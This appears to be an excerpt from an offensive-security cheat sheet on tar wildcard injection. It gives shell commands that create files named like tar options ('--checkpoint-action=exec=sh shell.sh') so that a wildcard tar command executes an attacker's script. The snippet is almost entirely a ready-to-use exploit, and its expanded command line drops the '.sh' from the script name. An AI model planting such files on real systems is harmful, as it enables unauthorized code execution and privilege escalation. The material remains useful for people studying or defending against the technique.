## Tar

### Tar wildcard injection

```shell
# create files
touch "--checkpoint=1"
touch "--checkpoint-action=exec=sh shell.sh"

# then
tar -cf archive.tar *
# becomes, which executes the command specified in the second filename
tar -cf archive.tar --checkpoint=1 --checkpoint-action=exec=sh shell
```